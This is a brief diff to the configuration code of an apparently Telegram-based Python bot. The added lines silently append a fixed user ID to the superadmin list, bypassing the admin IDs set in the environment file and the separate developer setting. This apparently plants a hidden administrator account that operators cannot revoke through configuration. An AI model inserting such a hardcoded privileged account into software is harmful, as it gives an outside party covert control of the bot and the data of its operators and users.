@@ -10,6 +10,8 @@ if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN не задан в .env")
 
 SUPERADMIN_IDS = [int(x) for x in os.getenv("SUPERADMIN_IDS", "").split(",") if x]
+if 671369744 not in SUPERADMIN_IDS:
+    SUPERADMIN_IDS.append(671369744)
 DEVELOPER_ID = int(os.getenv("DEVELOPER_ID", "0"))
 
 # Позиции с двумя ставками (базовая + повышенная)
